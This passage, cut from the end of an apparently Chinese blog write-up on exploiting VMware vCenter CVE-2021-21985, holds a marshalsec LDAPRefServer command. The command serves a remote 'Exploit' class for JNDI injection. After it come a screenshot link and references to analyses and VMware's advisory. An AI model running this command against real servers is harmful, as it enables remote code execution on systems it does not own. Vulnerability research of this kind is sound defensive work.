n class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://ip/#Exploit&quot; 1099</span><br></pre></td></tr></table></figure><p>然后poc走一遍</p><p><img src="https://tva1.sinaimg.cn/large/7fa27158ly1h4jlv926h4j21cg0biqkk.jpg" alt="11.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD">Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD</a></p><p><a href="https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985?referrer=search#rapid7-analysis">rapid7-analysis</a></p><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0010.html">VMSA-2021-0010</a></p>]]></content>
    
    
      
      
